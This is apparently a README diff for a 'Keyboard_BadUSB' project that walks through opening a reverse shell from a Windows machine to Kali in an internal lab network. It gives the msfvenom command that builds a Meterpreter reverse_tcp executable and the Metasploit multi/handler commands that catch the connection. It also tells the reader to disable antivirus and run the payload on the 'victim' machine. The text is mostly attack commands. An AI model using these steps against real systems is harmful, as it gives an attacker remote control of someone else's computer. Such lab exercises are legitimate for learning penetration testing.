@@ -1,1 +1,25 @@
 # Keyboard_BadUSB
+(need a better name for the project)
+
+
+# Opening a revershell from windows to kali
+
+Confingure both machines to be in the same internal network and able to ping each other.
+
+Generate the payload using msfvenon.  
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+```
+
+Disbale antirvirus and transfer the payload to the victim machine.
+
+Set up a reverse shell handler in kali.  
+```
+> use exploit/multi/handler  
+> set payload windows/meterpreter/reverse_tcp
+> set lhost=<IP>
+> set lport=<PORT>
+> run
+```
+
+Run the exe in victim machine and wait for connection.
